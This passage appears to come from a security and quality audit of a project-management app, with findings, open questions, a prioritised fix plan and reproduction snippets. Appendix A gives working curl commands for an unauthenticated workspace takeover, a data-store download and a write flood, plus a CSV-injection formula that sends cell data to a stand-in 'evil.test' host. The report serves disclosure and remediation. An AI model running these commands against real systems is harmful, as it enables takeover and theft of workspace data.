| **MIN-05** | Dead or inconsistent code (🔍): `requireManager` is never used; milestone status "Complete" vs project status "Completed"; milestone month shown as a bare number; temp files `.atlas-store.<pid>.<ts>.tmp` are never cleaned if a write fails after creation; `PUT /api/settings` replaces whole top-level branches (a partial `workspace` object reset `organization.legalName` and the login headline to defaults — ✅). | Confusing behaviour for API clients; clutter. | P3 | Remove dead code, normalise vocabularies, clean temp files on failure, use deep-merge/`PATCH` semantics for settings. |

---

## 4. Assumptions the project silently makes

| # | Assumption | Where it shows | Risk if false |
|---|---|---|---|
| 1 | The network is trusted or loopback-only. | SEC-01…03; dev binds `0.0.0.0`; runbook offers `ATLAS_HOST=0.0.0.0`. | Remote takeover/data download. |
| 2 | Exactly one process ever writes the data file. | DATA-02, DESK-01. | Lost updates. |
| 3 | The disk is reliable, has space, and rename-without-fsync is durable. | DATA-02. | Corrupt/empty store after a crash. |
| 4 | Datasets stay small (160 tasks were tested). | ARCH-01. | Multi-second stalls from ~10k tasks. |
| 5 | Administrators never mistype configuration or forget a password. | VAL-01, SEC-06. | Workspace-wide outage / lock-out. |
| 6 | One workspace timezone, Gregorian calendar, Monday-first weeks, `en-US` dates, USD. | REP-03, UX-03. | Wrong periods and formats for he/ar/fa users. |
| 7 | Language, theme and density are workspace-wide decisions. | UX-03, UX-07. | Multilingual teams can't coexist. |
| 8 | A user is exactly one person; status labels and project codes are unique and stable. | DATA-05, VAL-05. | Misattribution, colliding ids. |
| 9 | Task text is plain text, never a spreadsheet formula. | SEC-08. | Exported-file attacks. |
| 10 | Everyone authenticated may see everyone's data and activity. | SEC-07, GOV-02. | Privacy/compliance exposure. |
| 11 | Constant "minutes" approximate real effort. | DATA-04. | Misleading people analytics. |
| 12 | Reports may be recomputed from current state. | REP-02. | Non-reproducible history. |
| 13 | The Electron GUI and installers work (never launched). | DESK-04. | Failed first release. |
| 14 | Modern Chromium, Node ≥ 22.12 and a Linux-validated toolchain are enough. | BUILD-01, DESK-04. | Environment-specific breakage. |
| 15 | Long documentation implies accurate documentation. | DOC-01. | Operators follow wrong guidance. |

---

## 5. Information gaps and open questions

### 5.1 Missing information (not stated anywhere in the repository)

- Intended users/personas, scenarios, and the deployment model (personal desktop vs. team server vs. internet-facing).
- Expected scale (users, tasks per day, retention horizon) and availability targets (SLO, backup RPO/RTO).
- Threat model, security level, data classification and the compliance regime (privacy, employee data, accessibility).
- Authoritative metric definitions: delivery rate, project health, "on track", capacity, "focused effort".
- Browser/OS support matrix, accessibility target (e.g. WCAG 2.2 AA), and who reviews Arabic/Persian/Hebrew translations.
- Release, versioning, upgrade and rollback policy; owner/maintainers; support model; licence; the real application identifier.
- Integration roadmap (VCS/CI/chat/email) and identity roadmap (SSO/MFA).

### 5.2 Unresolved questions (the answers change priorities)

1. **Who runs this, and where?** One person's laptop, a team server on a LAN, or the internet? (Turns SEC-04…07 from "should" to "must" and selects ARCH-02 path A or B.)
2. **What scale** must it handle in 12–24 months? (ARCH-01: P2 → P1 above ~10k tasks.)
3. **Are per-person activity and "minutes" for performance evaluation** or team awareness, and in which jurisdictions? (GOV-02, DATA-04.)
4. **What do "Delivery rate", "Health", "On track" and "Capacity" mean**, and should reports be historical snapshots or live? (REP-01…03.)
5. **Should workflow transitions/approvals and field/module ACLs be enforced**, or are they aspirational? (VAL-05, UX-07, SEC-07.)
6. **Is SSO/MFA/email invitation required?** (GOV-03.)
7. **Are per-user language/theme required?** Is the Jalali calendar / Arabic-Indic numerals in scope? (UX-03.)
8. **Is offline use a real requirement** (justifying a service worker and "local-first")? (DESK-05, ARCH-02.)
9. **Which desktop OSs are first-class**, and is signed, auto-updating distribution planned? Who owns the `appId`? (DESK-04, GOV-04.)
10. **What are the backup RPO/RTO, retention and erasure requirements?** (DATA-03, GOV-02.)
11. **Can a person exist without an account, and can one person have several?** (DATA-05, GOV-03.)
12. **Under what licence is the code and are the fonts distributed?** (BUILD-03, GOV-04.)
13. **Can you share the original project brief** ("the project described below")? It would let me re-run §2 against explicit requirements rather than the repository's own claims.

---

## 6. Prioritised action plan

Effort: **S** < 1 day · **M** 1–3 days · **L** > 1 week (one engineer, rough).

### 6.1 Necessary corrections, in order

| Order | Action | Fixes | Effort |
|---|---|---|---|
| **P0 — this week, before the app is reachable by anyone else** | | | |
| 1 | Reject `POST /api/setup` when configured (409) and require a one-time setup token / loopback for first run; never swap `store` inside a handler | SEC-01 | S |
| 2 | Make dev mode loopback-only by default; move the default data dir out of the Vite root and add `server.fs.deny`; fix `X-Frame-Options`; rewrite README quick start ("dev only"; real data → production + absolute `ATLAS_DATA_DIR`) | SEC-02, DATA-07 | S |
| 3 | Authenticate or delete `/api/i18n/missing`; cap/dedupe in memory; stop shipping `missingKeys`/catalogs in bootstrap | SEC-03 | S |
| 4 | Add regression tests for 1–3 and run them in CI | QA-01 | S |
| **P1 — before any real users or real data** | | | |
| 5 | Schema validation for every request and for stored settings; JSON 404/error handlers; defensive presenters; settings "safe mode" | VAL-01…04, UX-04 | M |
| 6 | Durable, consistent persistence: build → persist → swap with rollback, `fsync`, lock file + single-instance lock, writable-aware health, **fail closed / auto-restore on a corrupt store** | DATA-01, DATA-02, DESK-01, MIN-01 | M |
| 7 | Backups: fix env parsing, add `restore:data` with validation, automatic daily/pre-migration/pre-destructive snapshots with generation retention, verification | DATA-03 | M |
| 8 | Auth hardening: async hashing, throttling/lockout, dummy-hash for unknown users, random 128-bit sessions with expiry/revocation, password change + reset CLI, last-admin and unique-email guards | SEC-04…06 | M |
| 9 | Authorization redesign: role-scoped bootstrap, ownership checks, bind activity `personId`, enforce or delete inert permission maps | SEC-07 | M–L |
| 10 | CSV formula escaping and Unicode-safe filenames | SEC-08, UX-03 (part) | S |
| 11 | Demo-data controls: gate `reset:data`, never serve passwords, accurate banner, fix the TDZ crash | SEC-09, BUILD-02 | S |
| 12 | Delete synthetic back-fill; capture real time or drop "minutes"; make the ledger append-only | DATA-04, REP-02 | M |
| 13 | Define and fix metrics/charts; compute dashboard widgets from data | REP-01…03 | M |
| 14 | Pagination and server-side filtering; real "My work" scoping | UX-01, UX-02 | M |
| 15 | Replace DOM-rewrite i18n (or restrict it to chrome with `data-no-i18n` on data nodes immediately) | UX-03 | L (S for the mitigation) |
| 16 | Make Settings honest: enforce, label or remove each setting; send diffs, not defaults | UX-07, MIN-05 | M |
| 17 | Quality foundation: Vitest + API tests (incl. abuse cases) + Playwright smoke + `tsc --noEmit` + ESLint/Prettier + CI; written acceptance criteria | QA-01, QA-02, ARCH-03 | M |
| 18 | Prove desktop packaging: commit icons, CI build + launch test, signing/notarisation, real `appId` | DESK-04 | M |
| 19 | Write the product brief and run a privacy review (DPIA) for per-person analytics | GOV-01, GOV-02 | S–M (non-code) |
| **P2 — next iteration** | | | |
| 20 | SQLite (WAL) + migrations + pagination + indexed lookups + cached reports; compression | ARCH-01, ARCH-02, DATA-06 | L |
| 21 | HTTP hardening (CSP without `unsafe-inline`, Host/Origin checks, helmet, no-store), password parameters, file permissions, append-only audit | SEC-10…13 | M |
| 22 | Referential integrity, soft-delete/archival, immutable project keys; safer destructive-action UX (explicit "advance" control, descriptive confirms, undo) | DATA-05, UX-06 | M |
| 23 | Enforce workflow transitions/approvals; key UI by state id | VAL-05 | M |
| 24 | Electron hardening (sandbox, navigation guards, menu roles, utility process, random port + token) | DESK-02, DESK-03 | M |
| 25 | Accessibility pass (labels, dialogs, focus, keyboard DnD alternative, live regions, axe in CI) | UX-05 | M |
| 26 | PWA decision (remove or implement properly) | DESK-05 | S |
| 27 | Pin dependencies, `.nvmrc`/`engine-strict`, Renovate/Dependabot, Electron cadence | BUILD-01 | S |
| 28 | Reconcile documentation; generate API docs from OpenAPI; test documented commands | DOC-01, VAL-03 | M |
| 29 | Query-builder grouping/typed fields; router/deep links; concurrency control | UX-08, UX-09 | M–L |
| 30 | Identity roadmap: OIDC SSO, invitation tokens instead of admin-set passwords, enforced user↔person link | GOV-03 | L |
| **P3 — hygiene** | | | |
| 31 | LICENSE + notices, dedupe/convert fonts, prune CSS, headers/caching, PDF font, health endpoint, dead code | BUILD-03, GOV-04, MIN-01…05, DOC-02 | S–M |

### 6.2 Missing information to provide

See §5.1 — in particular the deployment model, scale target, compliance regime and metric definitions; these unblock items 2, 5, 9, 15, 19 and 20.

### 6.3 Unresolved questions

See §5.2 (13 questions). Questions 1–3 should be answered first; they change the priority of roughly a third of the findings.

### 6.4 Recommended improvements beyond fixes

- **Architecture:** repository/service layer over SQLite with migrations (Drizzle/Kysely), background worker for reports, structured logs (pino) with request ids, metrics and error reporting.
- **Product:** import (CSV/Jira), VCS/CI integrations, notifications (email/webhook) that actually send, real-time updates, comments/attachments/dependencies/estimates, per-user preferences, SSO.
- **Quality:** OpenAPI contract tests, visual regression for RTL, pseudo-localisation, accessibility CI, load tests at 10× expected volume, a security-regression suite built from Appendix A.
- **Delivery:** reproducible builds (`npm ci`), SBOM + dependency PRs, signed releases and an update channel, a documented upgrade/rollback procedure.

---

## Appendix A — Reproduction snippets

All were run against throw-away data directories (`ATLAS_DATA_DIR=/tmp/...`). `$HOST` = the server. Cookies via `-c/-b`.

```bash
# SEC-01  re-initialise a configured workspace without credentials
curl -i -X POST $HOST/api/setup -H 'Content-Type: application/json' \
  -d '{"name":"Mallory","email":"m@evil.test","password":"Passw0rd!!"}'
# -> 200, role Administrator; previous users/projects/tasks are gone; original admin gets 401

# SEC-02  quick-start dev server leaks the store (default data dir ./data)
npm run app                       # NODE_ENV unset => binds 0.0.0.0
curl -s http://<host-ip>:5173/data/atlas-store.json | head -c 300
curl -sI http://<host-ip>:5173/app.tsx

# SEC-03  unauthenticated persistent writes
for i in $(seq 300); do
  curl -s -X POST $HOST/api/i18n/missing -H 'Content-Type: application/json' \
    -d "{\"key\":\"junk.$i\",\"language\":\"x$i\",\"fallback\":\"$(head -c 20000 /dev/zero | tr '\0' A)\"}" >/dev/null
done; ls -l data/atlas-store.json   # ~12 MB; admin settings save -> 413

# SEC-06  last admin demotes self -> zero administrators
curl -b admin.jar -X PUT $HOST/api/users/$MY_USER_ID -H 'Content-Type: application/json' -d '{"role":"Viewer"}'

# SEC-07  Developer forges an activity entry for a colleague
curl -b dev.jar -X POST $HOST/api/activity -H 'Content-Type: application/json' \
  -d '{"personId":"<colleague person id>","today":"Shipped the fix"}'

# SEC-08  CSV injection: create a task titled =HYPERLINK("http://evil.test/?d="&A1,"x"), then Export -> CSV

# SEC-09  demo admin without the opt-in flag, under NODE_ENV=production
NODE_ENV=production node dist-desktop/app.mjs --reset-data   # then log in as maya@atlas.local / atlas-demo

# VAL-01  poison pills
curl -b dev.jar   -X POST $HOST/api/tasks -H 'Content-Type: application/json' -d '{"title":"x","projectId":1,"dueDate":"nope"}'  # 500, but saved
curl -b admin.jar $HOST/api/bootstrap                                                                                            # 500 for every user
curl -b admin.jar -X PUT $HOST/api/settings -H 'Content-Type: application/json' -d '{"workspace":{"defaultTimezone":"Europe/Amsterdm"}}'

# DATA-01  corrupt store -> empty first-run workspace, then claim it
truncate -s 700 data/atlas-store.json && restart && curl $HOST/api/setup/status   # configured:false

# DATA-03  one bad env var deletes every backup
ATLAS_BACKUP_RETENTION=abc npm run backup:data; ls data/backups                      # empty

# BUILD-02  documented dev-data command crashes
ATLAS_ALLOW_DEMO_DATA=true npm run reset:data   # ReferenceError: Cannot access 'store' before initialization

# VAL-03  unknown API route returns 200 + HTML
curl -i -X PUT $HOST/api/alerts/al1 -H 'Cookie: ...' -d '{}'
```

UI-level findings (UX-01/02/03/04/06, SEC-08) were reproduced by loading the production client bundle (`esbuild src/main.tsx --bundle --format=iife`) into jsdom 26 against the live server and driving it with DOM events; they are not real-browser runs.

## Appendix B — Environment and method

- Node v22.22.3, npm 10.9.8, Debian 12. `npm ci` → 408 packages; `npm audit` → **0 vulnerabilities** (2026-10-02). Express 5.2.1, React 19.3.0, Vite 8.3.2, Electron 44.5.1 (binary not downloaded), jsPDF 4.2.1, jspdf-autotable 5.0.8.
- `npm run build` succeeded; `dist-desktop/app.mjs` is byte-identical to the committed file. Main JS bundle 480 KB (129 KB gzip); PDF chunk 393 KB + html2canvas 199 KB loaded lazily.
- `node scripts/final-validation.mjs` → 23/23 pass (468 ms for 160 task creations).
- TypeScript 5 with `@types/react|node|express`: 432 errors with the repo's `tsconfig` (`strict:false`), 1,410 with `--strict`.
- Scale test: synthetic stores of 1k/10k/50k tasks (plus matching work logs) on the production bundle.
- Not covered: real browsers, Electron GUI, Windows/macOS packaging, assistive technology, print preview, multi-machine load.
